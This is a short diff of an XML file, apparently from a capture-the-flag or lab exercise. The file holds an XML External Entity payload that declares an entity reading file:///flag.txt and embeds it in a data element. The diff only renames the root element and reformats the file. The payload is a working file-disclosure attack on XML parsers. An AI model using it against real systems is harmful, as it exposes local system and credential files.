@@ -1,5 +1,9 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY >
+
+<!DOCTYPE root [
+  <!ELEMENT root ANY >
   <!ENTITY xxe SYSTEM "file:///flag.txt" >]>
-<root><data>&xxe;</data></root>
+
+<root>
+  <data>&xxe;</data>
+</root>
